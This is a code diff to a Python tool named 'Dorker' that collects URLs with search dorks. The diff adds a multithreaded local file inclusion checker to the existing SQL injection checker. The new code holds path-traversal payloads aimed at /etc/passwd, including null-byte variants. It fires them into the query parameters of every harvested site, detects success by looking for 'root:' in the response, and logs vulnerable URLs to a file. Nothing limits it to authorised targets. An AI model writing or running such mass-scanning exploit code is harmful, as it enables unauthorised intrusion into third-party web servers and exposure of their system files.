@@ -10,14 +10,21 @@ from urllib3.util import Retry
 from urllib3.util import Timeout
 from multiprocessing import Pool, freeze_support
 
-version = "1.5"
+version = "1.6"
 info = (Fore.RESET + "\n  Dorker" + "\n   Version: " + version + " made with ♥ by FARBER")
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 dorks = []
 dorker_urls = []
 sites = []
 result_name = "dorker_results.txt"
-num_threads = 5
+num_threads = 15
+
+payload = [
+    r'../../../../../../../../../../../../../../../../../etc/passwd',
+    r'../../../../../../../../../../../../../../../../../etc/passwd%00',
+    r'/etc/passwd',
+    r'/etc/passwd%00'
+]
 
 ua = ['Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; zh-cn) Opera 8.65',
       'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; en) Opera 9.50',
@@ -248,10 +255,89 @@ def sqli_checker(site):
             else:
                 print(Fore.RED + str(site) + " not vulnerable!")
 
-        except Exception as ex:
-            print(Fore.YELLOW + str(site))
+        except:
+            print(Fore.YELLOW + "\n[!] Exception: " + str(site))
     else:
-        print(Fore.YELLOW + "\nSkipping " + site + "\n")
+        print(Fore.YELLOW + "Skipping " + site + "")
+
+
+def lfi_checker(url_list):
+    global sites, payload
+    if "=" in url_list:
+        if not str(url_list).startswith("https://cve.mitre.org") and not str(url_list).startswith(
+                "http://cve.mitre.org"):
+            site = url_list.split("=")
+            number_of_parameters = len(site)
+            # 1
+            if number_of_parameters == 2:
+                try:
+                    print(Fore.RESET + "Trying " + site[0] + "=PAYLOAD")
+                    for exploit in payload:
+                        # Request with payload
+                        http_request1 = http.request("GET", str(site[0]) + "=" + exploit, retries=Retry(4),
+                                                     timeout=Timeout(9))
+                        http_response1 = str(http_request1.data)
+                        if "root:" in http_response1:
+                            print(Fore.GREEN + "[+] Vulnerable URL: " + site[0] + "=" + exploit)
+                            f = open("lfi.txt", "a")
+                            f.write(site[0] + "=" + exploit + "\n")
+                            f.close()
+                except:
+                    print(Fore.YELLOW + "\n[!] Exception: " + str(url_list))
+
+            # 2
+            elif number_of_parameters == 3:
+                try:
+                    print(Fore.RESET + "Trying " + str(url_list.split("&")[0]) + "&" + str(
+                        url_list.split("&")[1].split("=")[0]) + "=PAYLOAD")
+                    for exploit in payload:
+                        # Request with payload
+                        http_request2_1 = http.request("GET", str(url_list.split("&")[0]) + "&" + str(
+                            url_list.split("&")[1].split("=")[0]) + "=" + exploit, retries=Retry(4), timeout=Timeout(9))
+                        http_response2_1 = str(http_request2_1.data)
+                        if "root:" in http_response2_1:
+                            print(Fore.GREEN + "[+] Vulnerable URL: " + str(url_list.split("&")[0]) + "&" + str(
+                                url_list.split("&")[1].split("=")[0]) + "=" + exploit)
+                            f = open("lfi.txt", "a")
+                            f.write(str(url_list.split("&")[0]) + "&" + str(
+                                url_list.split("&")[1].split("=")[0]) + "=" + exploit + "\n")
+                            f.close()
+
+                        # Request with payload
+                        print(str(url_list.split("&")[0].split("=")[0]) + "=" + exploit + "&" + str(
+                            url_list.split("&")[1]))
+                        http_request2_2 = http.request("GET", str(
+                            url_list.split("&")[0].split("=")[0]) + "=" + exploit + "&" + str(url_list.split("&")[1]),
+                                                       retries=Retry(4), timeout=Timeout(9))
+                        http_response2_2 = str(http_request2_2.data)
+                        if "root:" in http_response2_2:
+                            print(Fore.GREEN + "[+] Vulnerable URL: " + str(url_list.split("&")[0]) + "&" + str(
+                                url_list.split("&")[1].split("=")[0]) + "=" + exploit)
+                            f = open("lfi.txt", "a")
+                            f.write(str(url_list.split("&")[0]) + "&" + str(
+                                url_list.split("&")[1].split("=")[0]) + "=" + exploit + "\n")
+                            f.close()
+                except:
+                    print(Fore.YELLOW + "\n[!] Exception: " + str(url_list))
+
+            elif number_of_parameters > 4:
+                try:
+                    print(Fore.RESET + "Trying " + site[0] + "=PAYLOAD")
+                    for exploit in payload:
+                        # Request with payload
+                        http_request1 = http.request("GET", str(site[0]) + "=" + exploit, retries=Retry(4),
+                                                     timeout=Timeout(9))
+                        http_response1 = str(http_request1.data)
+                        if "root:" in http_response1:
+                            print(Fore.GREEN + "[+] Vulnerable URL: " + site[0] + "=" + exploit)
+                            f = open("lfi.txt", "a")
+                            f.write(site[0] + "=" + exploit + "\n")
+                            f.close()
+                except:
+                    print(Fore.YELLOW + "\n[!] Exception: " + str(url_list))
+
+            else:
+                pass
 
 
 def specific_scan(site):
@@ -322,7 +408,8 @@ def main():
     usr_inpt = input('''
 [1] Dorker
 [2] SQLi checker
-[3] Scan specific site
+[3] LFI checker
+[4] Scan specific site
 [99] Exit
  [:]==> ''')
 
@@ -337,7 +424,7 @@ def main():
         dorker_mode = input(Fore.RESET + "\n[!] Start dorker in multithread mode? y/n\n [:]==> ")
         if dorker_mode != "n":
             freeze_support()
-            pool = Pool(num_threads)
+            pool = Pool(5)
             pool.map(dorker, dorks)
             pool.close()
             pool.join()
@@ -371,6 +458,22 @@ def main():
         exit(0)
 
     elif usr_inpt == "3":
+        try:
+            file_with_dorker_results = open(result_name, "r")
+            sites = [line.split("\n")[0] for line in file_with_dorker_results.readlines()]
+            file_with_dorker_results.close()
+        except Exception as ex:
+            print(Fore.RESET + "Error:\n" + str(ex))
+
+        freeze_support()
+        pool = Pool(num_threads)
+        pool.map(lfi_checker, sites)
+        pool.close()
+        pool.join()
+        print(Fore.RESET + "\nThanks for using D0RK3R!")
+        exit(0)
+
+    elif usr_inpt == "4":
         site = input(Fore.RESET + "[!] Enter site:\n [:]==> ")
         specific_scan(site)
         exit(0)
